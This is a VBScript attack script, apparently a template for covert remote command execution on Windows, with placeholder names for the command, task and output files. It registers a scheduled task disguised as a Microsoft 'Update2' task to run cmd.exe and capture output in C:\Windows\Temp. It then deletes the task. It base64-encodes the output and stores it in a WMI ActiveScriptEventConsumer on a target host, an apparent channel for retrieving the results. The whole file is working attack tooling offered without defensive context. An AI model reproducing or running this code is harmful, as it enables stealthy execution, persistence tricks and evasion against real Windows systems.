FilePath = "C:\Windows\Temp\BBBBBBBBBBB"
FilePath2 = "C:\Windows\Temp\DDDDDDDDDDer_.txt"

Set fso=CreateObject("Scripting.FileSystemObject")
If fso.fileExists(FilePath) Then
    Set objFileToRead = CreateObject("Scripting.FileSystemObject")
    file2size = objFileToRead.GetFile(FilePath2).size

    If file2size <> 0 Then
        Set fileread = objFileToRead.OpenTextFile(FilePath2,1)
        strFileText = fileread.ReadAll()
        b64text = str_to_base64(strFileText)
    Else
        Set fileread = objFileToRead.OpenTextFile(FilePath,1)
        strFileText = fileread.ReadAll()
        b64text = str_to_base64(strFileText)
    End If
    Set objLocator = CreateObject("wbemscripting.swbemlocator")
    Set SubobjSWbemServices = objLocator.ConnectServer(host, "root/subscription")
    Set temp = SubobjSWbemServices.Get("ActiveScriptEventConsumer")
    Set asec = temp.spawninstance_
    asec.name="CCCCCCCCCCCCC"
    Asec.scriptingengine="vbscript"
    Asec.scripttext = b64text
    asecpath=asec.put_
End If

Function Base64Decode(ByVal vCode)
 Set oNode = CreateObject("Msxml2.DOMDocument").CreateElement("base64")
 oNode.dataType = "bin.base64"
 oNode.text = vCode
 Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
 Set oNode = Nothing
End Function

Function Stream_BinaryToString(Binary)
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = 1
 BinaryStream.Open
 BinaryStream.Write Binary
 BinaryStream.Position = 0
 BinaryStream.Type = 2
 ' All Format =>  utf-16le - utf-8 - utf-16le
 BinaryStream.CharSet = "utf-8"
 Stream_BinaryToString = BinaryStream.ReadText
 Set BinaryStream = Nothing
End Function

Const TriggerTypeDaily = 1
Const ActionTypeExec = 0
Set service = CreateObject("Schedule.Service")
Call service.Connect
Dim rootFolder
Set rootFolder = service.GetFolder("\")
Dim taskDefinition
Set taskDefinition = service.NewTask(0)
Dim regInfo
Set regInfo = taskDefinition.RegistrationInfo
regInfo.Description = "Update2"
regInfo.Author = "Microsoft"
Dim settings
Set settings = taskDefinition.settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False
settings.DisallowStartIfOnBatteries = False
Dim triggers
Set triggers = taskDefinition.triggers
Dim trigger
Set trigger = triggers.Create(7)
Dim Action
Set Action = taskDefinition.Actions.Create(ActionTypeExec)
Action.Path = "c:\windows\system32\cmd.exe"
Action.arguments = chr(34) & "/Q /c AAAAAAAAAAAA > C:\Windows\Temp\BBBBBBBBBBB 2> C:\Windows\Temp\DDDDDDDDDDer_.txt" & chr(34)
Dim objNet, LoginUser
Set objNet = CreateObject("WScript.Network")
LoginUser = objNet.UserName
If UCase(LoginUser) = "SYSTEM" Then
Else
LoginUser = Empty
End If
Call rootFolder.RegisterTaskDefinition("CCCCCCCCCCCCC", taskDefinition, 6, LoginUser, , 3)
Call rootFolder.DeleteTask("CCCCCCCCCCCCC",0)

Function btoa(sourceStr)
    Dim i, j, n, carr, rarr(), a, b, c
    carr = Array("A", "B", "C", "D", "E", "F", "G", "H", _
            "I", "J", "K", "L", "M", "N", "O" ,"P", _
            "Q", "R", "S", "T", "U", "V", "W", "X", _
            "Y", "Z", "a", "b", "c", "d", "e", "f", _
            "g", "h", "i", "j", "k", "l", "m", "n", _
            "o", "p", "q", "r", "s", "t", "u", "v", _
            "w", "x", "y", "z", "0", "1", "2", "3", _
            "4", "5", "6", "7", "8", "9", "+", "/")
    n = Len(sourceStr)-1
    ReDim rarr(n\3)
    For i=0 To n Step 3
        a = AscW(Mid(sourceStr,i+1,1))
        If i < n Then
            b = AscW(Mid(sourceStr,i+2,1))
        Else
            b = 0
        End If
        If i < n-1 Then
            c = AscW(Mid(sourceStr,i+3,1))
        Else
            c = 0
        End If
        rarr(i\3) = carr(a\4) & carr((a And 3) * 16 + b\16) & carr((b And 15) * 4 + c\64) & carr(c And 63)
    Next
    i = UBound(rarr)
    If n Mod 3 = 0 Then
        rarr(i) = Left(rarr(i),2) & "=="
    ElseIf n Mod 3 = 1 Then
        rarr(i) = Left(rarr(i),3) & "="
    End If
    btoa = Join(rarr,"")
End Function


Function char_to_utf8(sChar)
    Dim c, b1, b2, b3
    c = AscW(sChar)
    If c < 0 Then
        c = c + &H10000
    End If
    If c < &H80 Then
        char_to_utf8 = sChar
    ElseIf c < &H800 Then
        b1 = c Mod 64
        b2 = (c - b1) / 64
        char_to_utf8 = ChrW(&HC0 + b2) & ChrW(&H80 + b1)
    ElseIf c < &H10000 Then
        b1 = c Mod 64
        b2 = ((c - b1) / 64) Mod 64
        b3 = (c - b1 - (64 * b2)) / 4096
        char_to_utf8 = ChrW(&HE0 + b3) & ChrW(&H80 + b2) & ChrW(&H80 + b1)
    Else
    End If
End Function

Function str_to_utf8(sSource)
    Dim i, n, rarr()
    n = Len(sSource)
    ReDim rarr(n - 1)
    For i=0 To n-1
        rarr(i) = char_to_utf8(Mid(sSource,i+1,1))
    Next
    str_to_utf8 = Join(rarr,"")
End Function

Function str_to_base64(sSource)
    str_to_base64 = btoa(str_to_utf8(sSource))
End Function



